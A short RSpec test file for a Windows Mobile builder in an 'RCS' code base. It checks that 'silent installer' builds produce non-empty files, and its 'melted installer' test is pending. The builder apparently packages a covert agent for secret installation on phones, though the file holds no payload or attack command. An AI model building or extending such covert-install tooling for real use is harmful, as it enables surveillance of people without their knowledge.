require_relative 'shared'

# Note: signtool.exe should be executed with administrative privileges

module RCS::DB
  describe BuildWinMo, build: true do

    shared_spec_for(:winmo)

    before(:all) do
      RCS::DB::Config.instance.load_from_file
    end

    describe 'Windows Mobile builder' do
      [{}, {'type' => 'local'}, {'type' => 'remote'}].each do |package|
        it "should create the silent installer (with package = #{package.inspect})" do
          params = {
            'factory' => {'_id' => @factory.id},
            'binary'  => {'demo' => false},
            'melt'    => {},
            'package' => package
          }

          subject.create(params)

          subject.outputs.each do |name|
            path = subject.path(name)
            size = File.size(path)
            expect(size).not_to eql(0)
          end
        end
      end

      it 'should create the melted installer' do
        pending
      end

      it 'should create the ugrade build' do
        @agent.upgrade!
      end
    end
  end
end
